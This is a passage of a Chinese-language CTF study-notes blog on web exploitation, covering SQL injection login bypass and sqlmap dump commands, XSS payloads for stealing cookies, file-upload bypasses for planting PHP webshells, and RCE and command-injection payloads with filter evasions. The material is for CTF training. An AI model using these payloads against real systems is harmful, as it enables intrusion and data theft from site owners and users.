([GXYCTF2019]BabySQli)</h2><h3 id="利用mysql在联合查询不存在的数据时，会自动构建虚拟数据的特性"><a href="#利用mysql在联合查询不存在的数据时，会自动构建虚拟数据的特性" class="headerlink" title="利用mysql在联合查询不存在的数据时，会自动构建虚拟数据的特性"></a>利用mysql在联合查询不存在的数据时，会自动构建虚拟数据的特性</h3><h3 id="比如我们使用："><a href="#比如我们使用：" class="headerlink" title="比如我们使用："></a>比如我们使用：</h3><blockquote>
<p>select * from user where username &#x3D; ‘wxs’ union select 1,’admin’,’123456’;</p>
</blockquote>
<h3 id="原本库里没有123456，但mysql自动给我们加上了，相当于我们临时创建了一个admin用户，密码是123456。"><a href="#原本库里没有123456，但mysql自动给我们加上了，相当于我们临时创建了一个admin用户，密码是123456。" class="headerlink" title="原本库里没有123456，但mysql自动给我们加上了，相当于我们临时创建了一个admin用户，密码是123456。"></a>原本库里没有123456，但mysql自动给我们加上了，相当于我们临时创建了一个admin用户，密码是123456。</h3><h3 id="但是一般密码位都有md5加密，所以将密码位md5加密后再注入。"><a href="#但是一般密码位都有md5加密，所以将密码位md5加密后再注入。" class="headerlink" title="但是一般密码位都有md5加密，所以将密码位md5加密后再注入。"></a>但是一般密码位都有md5加密，所以将密码位md5加密后再注入。</h3><h3 id="所以我们假设密码是123456，其md5值为：e10adc3949ba59abbe56e057f20f883e"><a href="#所以我们假设密码是123456，其md5值为：e10adc3949ba59abbe56e057f20f883e" class="headerlink" title="所以我们假设密码是123456，其md5值为：e10adc3949ba59abbe56e057f20f883e"></a>所以我们假设密码是123456，其md5值为：e10adc3949ba59abbe56e057f20f883e</h3><blockquote>
<p>name&#x3D;1’ union select 1,’admin’,’e10adc3949ba59abbe56e057f20f883e’#&amp;pw&#x3D;123456</p>
</blockquote>
<h3 id="这样在验证后面的pw（password）-123456时便可以通过我们建立的临时密码绕过"><a href="#这样在验证后面的pw（password）-123456时便可以通过我们建立的临时密码绕过" class="headerlink" title="这样在验证后面的pw（password）&#x3D;123456时便可以通过我们建立的临时密码绕过"></a>这样在验证后面的pw（password）&#x3D;123456时便可以通过我们建立的临时密码绕过</h3><h3 id="利用构造一个虚拟身份来进行伪造真实身份，从而绕过审核机制。"><a href="#利用构造一个虚拟身份来进行伪造真实身份，从而绕过审核机制。" class="headerlink" title="利用构造一个虚拟身份来进行伪造真实身份，从而绕过审核机制。"></a>利用构造一个虚拟身份来进行伪造真实身份，从而绕过审核机制。</h3><h3 id="sqlmap非常好用"><a href="#sqlmap非常好用" class="headerlink" title="sqlmap非常好用"></a>sqlmap非常好用</h3><blockquote>
<p>sqlmap -u “http:&#x2F;&#x2F;“  –dbs        #爆出所有的数据库<br>sqlmap -u “http:&#x2F;&#x2F;“  –tables     #爆出所有的数据表<br>sqlmap -u “http:&#x2F;&#x2F;“  –columns    #爆出数据库中所有的列<br>sqlmap -u “http:&#x2F;&#x2F;“  –current-db #查看当前的数据库<br>sqlmap -u “http:&#x2F;&#x2F;“ -D security –tables #爆出数据库security中的所有的表<br>sqlmap -u “http:&#x2F;&#x2F;“ -D security -T users –columns #爆出security数据库中users表中的所有的列<br>sqlmap -u “http:&#x2F;&#x2F;“ -D security -T users -C username –dump  #爆出数据库security中的users表中的username列中的所有数据</p>
</blockquote>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h2 id="XSS在ctf中一般体现为在网站中内置一个机器人，然后将flag藏在它的cookie中，以体现真实情况盗取他人高权限cookie进行操作的漏洞。我们的目的一般便是想办法让机器人访问我们制作的网站，从而获取它的cookie。"><a href="#XSS在ctf中一般体现为在网站中内置一个机器人，然后将flag藏在它的cookie中，以体现真实情况盗取他人高权限cookie进行操作的漏洞。我们的目的一般便是想办法让机器人访问我们制作的网站，从而获取它的cookie。" class="headerlink" title="XSS在ctf中一般体现为在网站中内置一个机器人，然后将flag藏在它的cookie中，以体现真实情况盗取他人高权限cookie进行操作的漏洞。我们的目的一般便是想办法让机器人访问我们制作的网站，从而获取它的cookie。"></a>XSS在ctf中一般体现为在网站中内置一个机器人，然后将flag藏在它的cookie中，以体现真实情况盗取他人高权限cookie进行操作的漏洞。我们的目的一般便是想办法让机器人访问我们制作的网站，从而获取它的cookie。</h2><h3 id="1-反射型和存储型"><a href="#1-反射型和存储型" class="headerlink" title="1)反射型和存储型"></a>1)反射型和存储型</h3><h3 id="反射型即网页直接将输入的内容输出出来，不储存在数据库中-存储型则将我们输入的内容储存在数据库中，危害更大"><a href="#反射型即网页直接将输入的内容输出出来，不储存在数据库中-存储型则将我们输入的内容储存在数据库中，危害更大" class="headerlink" title="反射型即网页直接将输入的内容输出出来，不储存在数据库中.存储型则将我们输入的内容储存在数据库中，危害更大."></a>反射型即网页直接将输入的内容输出出来，不储存在数据库中.存储型则将我们输入的内容储存在数据库中，危害更大.</h3><p><code>《script》alert(1)《/script》 </code>    由于网站的<code>&lt;</code>和<code>&gt;</code>闭合会让命令消失，所以用《》替代。</p>
<h3 id="利用alert弹窗验证是否有XSS漏洞"><a href="#利用alert弹窗验证是否有XSS漏洞" class="headerlink" title="利用alert弹窗验证是否有XSS漏洞"></a>利用alert弹窗验证是否有XSS漏洞</h3><h3 id="验证成功之后就可以去找XSS数据接收平台如蓝莲花等进行cookie捕获。"><a href="#验证成功之后就可以去找XSS数据接收平台如蓝莲花等进行cookie捕获。" class="headerlink" title="验证成功之后就可以去找XSS数据接收平台如蓝莲花等进行cookie捕获。"></a>验证成功之后就可以去找XSS数据接收平台如蓝莲花等进行cookie捕获。</h3><h3 id="2-dom反射"><a href="#2-dom反射" class="headerlink" title="2)dom反射"></a>2)dom反射</h3><h3 id="dom反射需要我们想办法把输入的命令从一个注释转换为一个注释加一个命令，思路就是提前用-《-script》闭合-然后再输入我们的命令。"><a href="#dom反射需要我们想办法把输入的命令从一个注释转换为一个注释加一个命令，思路就是提前用-《-script》闭合-然后再输入我们的命令。" class="headerlink" title="dom反射需要我们想办法把输入的命令从一个注释转换为一个注释加一个命令，思路就是提前用&#39;;《/script》闭合,然后再输入我们的命令。"></a>dom反射需要我们想办法把输入的命令从一个注释转换为一个注释加一个命令，思路就是提前用<code>&#39;;《/script》</code>闭合,然后再输入我们的命令。</h3><p><code>&#39;;《/script》《script》alert(1)《/script》</code></p>
<h3 id="利用alert弹窗验证是否有XSS漏洞-1"><a href="#利用alert弹窗验证是否有XSS漏洞-1" class="headerlink" title="利用alert弹窗验证是否有XSS漏洞"></a>利用alert弹窗验证是否有XSS漏洞</h3><h3 id="验证成功之后就可以去找XSS数据接收平台如蓝莲花等进行cookie捕获。-1"><a href="#验证成功之后就可以去找XSS数据接收平台如蓝莲花等进行cookie捕获。-1" class="headerlink" title="验证成功之后就可以去找XSS数据接收平台如蓝莲花等进行cookie捕获。"></a>验证成功之后就可以去找XSS数据接收平台如蓝莲花等进行cookie捕获。</h3><p><img src="https://pics.lwzheng.tech/2024/12/14/675c5ad8f1be5.png" alt="图片1" title="WP1"></p>
<h3 id="3-空格过滤和关键词过滤"><a href="#3-空格过滤和关键词过滤" class="headerlink" title="3)空格过滤和关键词过滤"></a>3)空格过滤和关键词过滤</h3><h3 id="空格过滤直接用-20替代，关键词过滤先判断过滤了哪个关键词，输入《script》alert-1-《-script》-后回显为alert-1-，说明script被过滤，直接大小写绕过，用Script代替script即可"><a href="#空格过滤直接用-20替代，关键词过滤先判断过滤了哪个关键词，输入《script》alert-1-《-script》-后回显为alert-1-，说明script被过滤，直接大小写绕过，用Script代替script即可" class="headerlink" title="空格过滤直接用%20替代，关键词过滤先判断过滤了哪个关键词，输入《script》alert(1)《/script》   后回显为&lt;&gt;alert(1)，说明script被过滤，直接大小写绕过，用Script代替script即可"></a>空格过滤直接用%20替代，关键词过滤先判断过滤了哪个关键词，输入<code>《script》alert(1)《/script》 </code>  后回显为&lt;&gt;alert(1)，说明script被过滤，直接大小写绕过，用Script代替script即可</h3><p><img src="https://pics.lwzheng.tech/2024/12/14/675d1041363d2.png" alt="图片1" title="WP1"></p>
<h3 id="4-dom跳转"><a href="#4-dom跳转" class="headerlink" title="4)dom跳转"></a>4)dom跳转</h3><h3 id="jumpto-javascript-getScript-网址-浏览器会将其解释为一种特殊的URL方案，即-“javascript-”。在这种情况下，浏览器会将后面的-JavaScript-代码作为URL的一部分进行解析，然后执行它"><a href="#jumpto-javascript-getScript-网址-浏览器会将其解释为一种特殊的URL方案，即-“javascript-”。在这种情况下，浏览器会将后面的-JavaScript-代码作为URL的一部分进行解析，然后执行它" class="headerlink" title="?jumpto=javascript:$.getScript(&quot;网址&quot;),浏览器会将其解释为一种特殊的URL方案，即 “javascript:”。在这种情况下，浏览器会将后面的 JavaScript 代码作为URL的一部分进行解析，然后执行它."></a><code>?jumpto=javascript:$.getScript(&quot;网址&quot;)</code>,浏览器会将其解释为一种特殊的URL方案，即 “javascript:”。在这种情况下，浏览器会将后面的 JavaScript 代码作为URL的一部分进行解析，然后执行它.</h3><p><img src="https://pics.lwzheng.tech/2024/12/14/675c5d980ee65.png" alt="图片1" title="WP1"></p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="1-无验证"><a href="#1-无验证" class="headerlink" title="1)无验证"></a>1)无验证</h2><h3 id="网站上传的文件如果能按php文件访问后执行，便可以通过上传一句话木马-的php文件，并通过蚁剑连接进行控制，在目录中找到flag，模拟实战中在对方网站中盗取数据的操作。"><a href="#网站上传的文件如果能按php文件访问后执行，便可以通过上传一句话木马-的php文件，并通过蚁剑连接进行控制，在目录中找到flag，模拟实战中在对方网站中盗取数据的操作。" class="headerlink" title="网站上传的文件如果能按php文件访问后执行，便可以通过上传一句话木马&#96;&#96;的php文件，并通过蚁剑连接进行控制，在目录中找到flag，模拟实战中在对方网站中盗取数据的操作。"></a>网站上传的文件如果能按php文件访问后执行，便可以通过上传一句话木马&#96;&#96;的php文件，并通过蚁剑连接进行控制，在目录中找到flag，模拟实战中在对方网站中盗取数据的操作。</h3><h3 id="所以直接新建一个-php文件，然后记事本打开，输入一句话木马，然后上传，蚁剑连接即可。"><a href="#所以直接新建一个-php文件，然后记事本打开，输入一句话木马，然后上传，蚁剑连接即可。" class="headerlink" title="所以直接新建一个.php文件，然后记事本打开，输入一句话木马，然后上传，蚁剑连接即可。"></a>所以直接新建一个.php文件，然后记事本打开，输入一句话木马，然后上传，蚁剑连接即可。</h3><h2 id="2-前端验证"><a href="#2-前端验证" class="headerlink" title="2)前端验证"></a>2)前端验证</h2><h3 id="前端验证可以按F12打开调试面板，选择网络，然后上传图片文件和非图片文件，然后对这两个文件的变化进行对比，如果网络中没有数据变化，说明存在js前端验证漏洞，如果有变化说明不存在。-有变化说明，前端没有做验证，是把文件传输到后台，在后台进行验证的，所以才会有网络请求。"><a href="#前端验证可以按F12打开调试面板，选择网络，然后上传图片文件和非图片文件，然后对这两个文件的变化进行对比，如果网络中没有数据变化，说明存在js前端验证漏洞，如果有变化说明不存在。-有变化说明，前端没有做验证，是把文件传输到后台，在后台进行验证的，所以才会有网络请求。" class="headerlink" title="前端验证可以按F12打开调试面板，选择网络，然后上传图片文件和非图片文件，然后对这两个文件的变化进行对比，如果网络中没有数据变化，说明存在js前端验证漏洞，如果有变化说明不存在。(有变化说明，前端没有做验证，是把文件传输到后台，在后台进行验证的，所以才会有网络请求。)"></a>前端验证可以按F12打开调试面板，选择网络，然后上传图片文件和非图片文件，然后对这两个文件的变化进行对比，如果网络中没有数据变化，说明存在js前端验证漏洞，如果有变化说明不存在。(有变化说明，前端没有做验证，是把文件传输到后台，在后台进行验证的，所以才会有网络请求。)</h3><h3 id="因为是在前端进行验证，所以直接BP拦截进行修改，先将上传的文件后缀名改为白名单中的后缀名，再在抓包后改回-php，蚁剑连接即可。"><a href="#因为是在前端进行验证，所以直接BP拦截进行修改，先将上传的文件后缀名改为白名单中的后缀名，再在抓包后改回-php，蚁剑连接即可。" class="headerlink" title="因为是在前端进行验证，所以直接BP拦截进行修改，先将上传的文件后缀名改为白名单中的后缀名，再在抓包后改回.php，蚁剑连接即可。"></a>因为是在前端进行验证，所以直接BP拦截进行修改，先将上传的文件后缀名改为白名单中的后缀名，再在抓包后改回.php，蚁剑连接即可。</h3><p><img src="https://pics.lwzheng.tech/2024/12/16/67600f33c32ff.png" alt="图片1" title="WP1"></p>
<h2 id="3-htaccess"><a href="#3-htaccess" class="headerlink" title="3).htaccess"></a>3).htaccess</h2><h3 id="htaccess文件是apache的分布式配置文件。他负责相关目录下的网页配置，通过-htaccess可以帮我们实现。必须以ASCII模式上传，并且给其可读性。"><a href="#htaccess文件是apache的分布式配置文件。他负责相关目录下的网页配置，通过-htaccess可以帮我们实现。必须以ASCII模式上传，并且给其可读性。" class="headerlink" title=".htaccess文件是apache的分布式配置文件。他负责相关目录下的网页配置，通过.htaccess可以帮我们实现。必须以ASCII模式上传，并且给其可读性。"></a>.htaccess文件是apache的分布式配置文件。他负责相关目录下的网页配置，通过.htaccess可以帮我们实现。必须以ASCII模式上传，并且给其可读性。</h3><blockquote>
<p>.htaccess可以帮我们实现:<br>网页301重定向<br>自定义404错误页面<br>改变文件扩展名（使用该功能进行文件上传绕过验证）<br>允许&#x2F;阻止特定的用户或者目录的访问<br>禁止目录列表<br>封禁特定IP地址的用户<br>只允许特定IP地址的用户<br>以及使用其他文件作为index文件配置默认文档等功能。</p>
</blockquote>
<blockquote>
<p>AddType application&#x2F;x-httpd-php .xxx   功能为将.xxx（如.png等）后缀的文件按.php文件执行</p>
</blockquote>
<h3 id="将这段代码写入本地新建的-htaccess文件，并进行上传，这时上传-xxx的一句话木马文件再用蚁剑连接即可"><a href="#将这段代码写入本地新建的-htaccess文件，并进行上传，这时上传-xxx的一句话木马文件再用蚁剑连接即可" class="headerlink" title="将这段代码写入本地新建的.htaccess文件，并进行上传，这时上传.xxx的一句话木马文件再用蚁剑连接即可"></a>将这段代码写入本地新建的.htaccess文件，并进行上传，这时上传.xxx的一句话木马文件再用蚁剑连接即可</h3><h2 id="4-MIME绕过"><a href="#4-MIME绕过" class="headerlink" title="4)MIME绕过"></a>4)MIME绕过</h2><h3 id="MIME-Multipurpose-Internet-Mail-Extensions-是描述消息内容类型的因特网标准。MIME消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。在HTTP协议中，使用Content-Type字段表示文件的MIME类型。"><a href="#MIME-Multipurpose-Internet-Mail-Extensions-是描述消息内容类型的因特网标准。MIME消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。在HTTP协议中，使用Content-Type字段表示文件的MIME类型。" class="headerlink" title="MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。MIME消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。在HTTP协议中，使用Content-Type字段表示文件的MIME类型。"></a>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。MIME消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。在HTTP协议中，使用Content-Type字段表示文件的MIME类型。</h3><h3 id="所以直接BP拦截，修改Content-Type字段为image-jpeg等网站白名单类型，上传-php类型的一句话木马，蚁剑连接即可。"><a href="#所以直接BP拦截，修改Content-Type字段为image-jpeg等网站白名单类型，上传-php类型的一句话木马，蚁剑连接即可。" class="headerlink" title="所以直接BP拦截，修改Content-Type字段为image&#x2F;jpeg等网站白名单类型，上传.php类型的一句话木马，蚁剑连接即可。"></a>所以直接BP拦截，修改Content-Type字段为image&#x2F;jpeg等网站白名单类型，上传.php类型的一句话木马，蚁剑连接即可。</h3><h2 id="5-文件头检查"><a href="#5-文件头检查" class="headerlink" title="5)文件头检查"></a>5)文件头检查</h2><h3 id="因为检验的是文件头，所以找一个现成的图片文件，将文件用记事本编辑，在最后写上一句话木马，上传时用BP拦截，修改文件后缀名为-php即可蚁剑访问。"><a href="#因为检验的是文件头，所以找一个现成的图片文件，将文件用记事本编辑，在最后写上一句话木马，上传时用BP拦截，修改文件后缀名为-php即可蚁剑访问。" class="headerlink" title="因为检验的是文件头，所以找一个现成的图片文件，将文件用记事本编辑，在最后写上一句话木马，上传时用BP拦截，修改文件后缀名为.php即可蚁剑访问。"></a>因为检验的是文件头，所以找一个现成的图片文件，将文件用记事本编辑，在最后写上一句话木马，上传时用BP拦截，修改文件后缀名为.php即可蚁剑访问。</h3><h2 id="6-00截断"><a href="#6-00截断" class="headerlink" title="6)00截断"></a>6)00截断</h2><h3 id="00即ascii码中的null，在读取文件名时遇见null会判断为文件名结束，所以可以用00截断文件名，构造-php-00-png的文件名（-00在url编码中为null），因为在上传后网址后多了一段-xxx-…-upload，所以可以上传文件时在BP中拦截，并在这段多出来的语句后面接上-php-00-png，通过url编码进行00截断，再蚁剑连接即可。"><a href="#00即ascii码中的null，在读取文件名时遇见null会判断为文件名结束，所以可以用00截断文件名，构造-php-00-png的文件名（-00在url编码中为null），因为在上传后网址后多了一段-xxx-…-upload，所以可以上传文件时在BP中拦截，并在这段多出来的语句后面接上-php-00-png，通过url编码进行00截断，再蚁剑连接即可。" class="headerlink" title="00即ascii码中的null，在读取文件名时遇见null会判断为文件名结束，所以可以用00截断文件名，构造.php%00.png的文件名（%00在url编码中为null），因为在上传后网址后多了一段?xxx&#x3D;…&#x2F;upload，所以可以上传文件时在BP中拦截，并在这段多出来的语句后面接上.php%00.png，通过url编码进行00截断，再蚁剑连接即可。"></a>00即ascii码中的null，在读取文件名时遇见null会判断为文件名结束，所以可以用00截断文件名，构造.php%00.png的文件名（%00在url编码中为null），因为在上传后网址后多了一段?xxx&#x3D;…&#x2F;upload，所以可以上传文件时在BP中拦截，并在这段多出来的语句后面接上.php%00.png，通过url编码进行00截断，再蚁剑连接即可。</h3><h2 id="7-双写截断"><a href="#7-双写截断" class="headerlink" title="7)双写截断"></a>7)双写截断</h2><h3 id="试着上传了-php文件后发现变成了-，说明php被删掉了，所以双写后缀名，让后缀名在被删掉一个php后还能是php，即-pphphp即可，再蚁剑连接即可。"><a href="#试着上传了-php文件后发现变成了-，说明php被删掉了，所以双写后缀名，让后缀名在被删掉一个php后还能是php，即-pphphp即可，再蚁剑连接即可。" class="headerlink" title="试着上传了.php文件后发现变成了.，说明php被删掉了，所以双写后缀名，让后缀名在被删掉一个php后还能是php，即.pphphp即可，再蚁剑连接即可。"></a>试着上传了.php文件后发现变成了.，说明php被删掉了，所以双写后缀名，让后缀名在被删掉一个php后还能是php，即.pphphp即可，再蚁剑连接即可。</h3><p><img src="https://pics.lwzheng.tech/2024/12/16/6760157d39103.png" alt="图片1" title="WP1"></p>
<h2 id="8-user-ini-（-SUCTF-2019-CheckIn）"><a href="#8-user-ini-（-SUCTF-2019-CheckIn）" class="headerlink" title="8).user.ini   （[SUCTF 2019]CheckIn）"></a>8).user.ini   （[SUCTF 2019]CheckIn）</h2><h3 id="xxxx-ini-文件是配置当前目录以及当前子目录的规则配置的文件，文件的中的配置会覆盖掉当前php-ini中的规则，是当前用户的配置文件，利用-user-ini-的前提是服务器开启了-CGI-或者-FastCGI，并且上传文件的存储路径下有-index-php-等可执行文件）。"><a href="#xxxx-ini-文件是配置当前目录以及当前子目录的规则配置的文件，文件的中的配置会覆盖掉当前php-ini中的规则，是当前用户的配置文件，利用-user-ini-的前提是服务器开启了-CGI-或者-FastCGI，并且上传文件的存储路径下有-index-php-等可执行文件）。" class="headerlink" title=".xxxx.ini　文件是配置当前目录以及当前子目录的规则配置的文件，文件的中的配置会覆盖掉当前php.ini中的规则，是当前用户的配置文件，利用 .user.ini 的前提是服务器开启了 CGI 或者 FastCGI，并且上传文件的存储路径下有 index.php 等可执行文件）。"></a>.xxxx.ini　文件是配置当前目录以及当前子目录的规则配置的文件，文件的中的配置会覆盖掉当前php.ini中的规则，是当前用户的配置文件，利用 .user.ini 的前提是服务器开启了 CGI 或者 FastCGI，并且上传文件的存储路径下有 index.php 等可执行文件）。</h3><h3 id="上传-user-ini-文件内容"><a href="#上传-user-ini-文件内容" class="headerlink" title="上传 .user.ini 文件内容"></a>上传 .user.ini 文件内容</h3><h3 id="二选一-就可以"><a href="#二选一-就可以" class="headerlink" title="二选一 就可以"></a>二选一 就可以</h3><blockquote>
<p>auto_prepend_file&#x3D;文件名		在页面顶部预加载文件<br>auto_append_file&#x3D;文件名		在页面的底部预加载文件</p>
</blockquote>
<h3 id="这两个配置的意思就是：我们指定一个文件（如-1-jpg），那么该文件就会被包含在要执行的-PHP-文件中（如-index-php），相当于在-index-php-中插入一句：require-1-jpg-。"><a href="#这两个配置的意思就是：我们指定一个文件（如-1-jpg），那么该文件就会被包含在要执行的-PHP-文件中（如-index-php），相当于在-index-php-中插入一句：require-1-jpg-。" class="headerlink" title="这两个配置的意思就是：我们指定一个文件（如 1.jpg），那么该文件就会被包含在要执行的 PHP 文件中（如 index.php），相当于在 index.php 中插入一句：require(.&#x2F;1.jpg);。"></a>这两个配置的意思就是：我们指定一个文件（如 1.jpg），那么该文件就会被包含在要执行的 PHP 文件中（如 index.php），相当于在 index.php 中插入一句：require(.&#x2F;1.jpg);。</h3><h4 id="蚁剑连接时不再是访问图片路径而是对应的php文件路径"><a href="#蚁剑连接时不再是访问图片路径而是对应的php文件路径" class="headerlink" title="蚁剑连接时不再是访问图片路径而是对应的php文件路径"></a>蚁剑连接时不再是访问图片路径而是对应的php文件路径</h4><h1 id="ctfhub-RCE"><a href="#ctfhub-RCE" class="headerlink" title="ctfhub_RCE"></a>ctfhub_RCE</h1><h2 id="1-eval执行"><a href="#1-eval执行" class="headerlink" title="1)eval执行"></a>1)eval执行</h2><h3 id="eval会将参数执行"><a href="#eval会将参数执行" class="headerlink" title="eval会将参数执行"></a>eval会将参数执行</h3><blockquote>
<p>常见的命令<br>（1）windows<br>1.type  显示文本文件内容<br>type x:\1.txt                      &#x2F;&#x2F;显示x盘下的1.txt文件内容<br>type x:\1.txt | more            &#x2F;&#x2F;分页显示x盘里1.txt的内容<br>more 1.txt                         &#x2F;&#x2F;逐屏显示当目下1.txt的文本内容（空格：下一屏 q：退出）<br>2.dir  显示目录里的内容<br>dir                &#x2F;&#x2F;显示当前目录里的子文件夹和文件<br>dir &#x2F;b            &#x2F;&#x2F;只显示当前目录子文件夹、文件的文件名<br>dir &#x2F;p            &#x2F;&#x2F;分页显示当前目录子文件夹、文件<br>dir &#x2F;ad          &#x2F;&#x2F;只显示当前目录中的文件夹<br>dir &#x2F;a-d         &#x2F;&#x2F;显示当目里的文件<br>dir x:&#x2F;a         &#x2F;&#x2F;显示x盘下a文件夹中的内容<br>dir 1.txt        &#x2F;&#x2F;显示当目下1.txt的信息<br>dir &#x2F;s            &#x2F;&#x2F;递归显示当目中的内容   ctrl c终止当前命令<br>dir a*           &#x2F;&#x2F;显示当目下a开头的文件、文件夹信息<br>dir &#x2F;ah &#x2F;os    &#x2F;&#x2F;显示当目下隐藏的文件和目录，按文件大小从小到大排序<br>(2)Linux<br>1、ls：列出目录<br>2、pwd：显示当前所在的目录<br>3、cat：由第一行开始查看文件<br>4、tac：由最后一行到第一行查看<br>5、more：逐项查看文件，按空格继续，最后自己退出<br>6、less：逐行查看文件，按方向键，不可主动退出，按q退出<br>7、head：只查看文件前十行<br>8、tail：只查看文件后十行</p>
</blockquote>
<h3 id="同时参数要以system-‘命令’-的形式传入，这样才能执行命令"><a href="#同时参数要以system-‘命令’-的形式传入，这样才能执行命令" class="headerlink" title="同时参数要以system(‘命令’);的形式传入，这样才能执行命令"></a>同时参数要以system(‘命令’);的形式传入，这样才能执行命令</h3><h3 id="这个题直接system-‘ls-‘-和system-‘cat-flag-5647’-就结束了"><a href="#这个题直接system-‘ls-‘-和system-‘cat-flag-5647’-就结束了" class="headerlink" title="这个题直接system(‘ls &#x2F;‘);和system(‘cat &#x2F;flag_5647’)就结束了"></a>这个题直接system(‘ls &#x2F;‘);和system(‘cat &#x2F;flag_5647’)就结束了</h3><h2 id="2-文件包含"><a href="#2-文件包含" class="headerlink" title="2)文件包含"></a>2)文件包含</h2><h3 id="代码中有一个shell-txt的超链接，访问进去发现有eval函数，但是我们无法直接向这个文件传入参数，所以要利用index-php中的include命令把这个shell-txt文件包含进来再进行传参。"><a href="#代码中有一个shell-txt的超链接，访问进去发现有eval函数，但是我们无法直接向这个文件传入参数，所以要利用index-php中的include命令把这个shell-txt文件包含进来再进行传参。" class="headerlink" title="代码中有一个shell.txt的超链接，访问进去发现有eval函数，但是我们无法直接向这个文件传入参数，所以要利用index.php中的include命令把这个shell.txt文件包含进来再进行传参。"></a>代码中有一个shell.txt的超链接，访问进去发现有eval函数，但是我们无法直接向这个文件传入参数，所以要利用index.php中的include命令把这个shell.txt文件包含进来再进行传参。</h3><h3 id="所以直接-file-shell-txt-cmd-system-‘ls-‘-和-file-shell-txt-cmd-system-‘cat-flag’-就可以了。"><a href="#所以直接-file-shell-txt-cmd-system-‘ls-‘-和-file-shell-txt-cmd-system-‘cat-flag’-就可以了。" class="headerlink" title="所以直接?file&#x3D;shell.txt&amp;cmd&#x3D;system(‘ls &#x2F;‘);和?file&#x3D;shell.txt&amp;cmd&#x3D;system(‘cat &#x2F;flag’);就可以了。"></a>所以直接?file&#x3D;shell.txt&amp;cmd&#x3D;system(‘ls &#x2F;‘);和?file&#x3D;shell.txt&amp;cmd&#x3D;system(‘cat &#x2F;flag’);就可以了。</h3><h2 id="3-php-input-远程包含-读取源代码"><a href="#3-php-input-远程包含-读取源代码" class="headerlink" title="3)php:&#x2F;&#x2F;input  远程包含   读取源代码"></a>3)php:&#x2F;&#x2F;input  远程包含   读取源代码</h2><blockquote>
<p>php:&#x2F;&#x2F;filter用于读取源码 php:&#x2F;&#x2F;input用于执行php代码<br>php:&#x2F;&#x2F;input需要post请求提交数据<br>php:&#x2F;&#x2F;filter可以get提交?a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p>
</blockquote>
<h3 id="这三个前第一个用php-input，然后post传php的命令即《-php-system-‘ls-‘-》和《-php-system-‘cat-flag-4627’-》"><a href="#这三个前第一个用php-input，然后post传php的命令即《-php-system-‘ls-‘-》和《-php-system-‘cat-flag-4627’-》" class="headerlink" title="这三个前第一个用php:&#x2F;&#x2F;input，然后post传php的命令即《?php system(‘ls &#x2F;‘);?》和《?php system(‘cat &#x2F;flag_4627’);?》"></a>这三个前第一个用php:&#x2F;&#x2F;input，然后post传php的命令即《?php system(‘ls &#x2F;‘);?》和《?php system(‘cat &#x2F;flag_4627’);?》</h3><h3 id="第二个和第一个几乎一样，直接php-input然后《-php-system-‘ls-‘-》和《-php-system-‘cat-flag’-》"><a href="#第二个和第一个几乎一样，直接php-input然后《-php-system-‘ls-‘-》和《-php-system-‘cat-flag’-》" class="headerlink" title="第二个和第一个几乎一样，直接php:&#x2F;&#x2F;input然后《?php system(‘ls &#x2F;‘);?》和《?php system(‘cat &#x2F;flag’);?》"></a>第二个和第一个几乎一样，直接php:&#x2F;&#x2F;input然后《?php system(‘ls &#x2F;‘);?》和《?php system(‘cat &#x2F;flag’);?》</h3><h3 id="第三个直接说了flag在-flag里面，所以直接php-filter-read-convert-base64-encode-resource-flag，再解码即可。"><a href="#第三个直接说了flag在-flag里面，所以直接php-filter-read-convert-base64-encode-resource-flag，再解码即可。" class="headerlink" title="第三个直接说了flag在&#x2F;flag里面，所以直接php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag，再解码即可。"></a>第三个直接说了flag在&#x2F;flag里面，所以直接php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag，再解码即可。</h3><h2 id="4-命令注入"><a href="#4-命令注入" class="headerlink" title="4)命令注入"></a>4)命令注入</h2><blockquote>
<p>常见的拼接符<br>1、A ; B     先执行A，再执行B<br>2、A &amp; B    简单的拼接<br>3、A | B      显示B的执行结果<br>4、A&amp;&amp;B    A执行成功之后才会执行B<br>5、A || B     A执行失败之后才会执行B<br>,           在特殊情况下可代替空格</p>
</blockquote>
<h3 id="直接127-0-0-1-ls和127-0-0-1-cat-13902158133348-php即可（一定要记得随手查看网页源代码）"><a href="#直接127-0-0-1-ls和127-0-0-1-cat-13902158133348-php即可（一定要记得随手查看网页源代码）" class="headerlink" title="直接127.0.0.1;ls和127.0.0.1;cat 13902158133348.php即可（一定要记得随手查看网页源代码）"></a>直接127.0.0.1;ls和127.0.0.1;cat 13902158133348.php即可（一定要记得随手查看网页源代码）</h3><h3 id="1-cat-被过滤，还可以用-more、less、head、tac、tail、nl、od、vi、vim-等方法进行绕过。"><a href="#1-cat-被过滤，还可以用-more、less、head、tac、tail、nl、od、vi、vim-等方法进行绕过。" class="headerlink" title="1.cat 被过滤，还可以用 more、less、head、tac、tail、nl、od、vi、vim 等方法进行绕过。"></a>1.cat 被过滤，还可以用 more、less、head、tac、tail、nl、od、vi、vim 等方法进行绕过。</h3><h3 id="2-过滤空格可以用-IFS-等方式替代"><a href="#2-过滤空格可以用-IFS-等方式替代" class="headerlink" title="2.过滤空格可以用${IFS}等方式替代"></a>2.过滤空格可以用<code>$&#123;IFS&#125;</code>等方式替代</h3><h3 id="3-过滤-，直接利用拼接命令的形式访问路径内的文件，就是先通过cd访问路径，再执行ls和cat的命令"><a href="#3-过滤-，直接利用拼接命令的形式访问路径内的文件，就是先通过cd访问路径，再执行ls和cat的命令" class="headerlink" title="3.过滤&#x2F;，直接利用拼接命令的形式访问路径内的文件，就是先通过cd访问路径，再执行ls和cat的命令"></a>3.过滤&#x2F;，直接利用拼接命令的形式访问路径内的文件，就是先通过cd访问路径，再执行ls和cat的命令</h3><h3 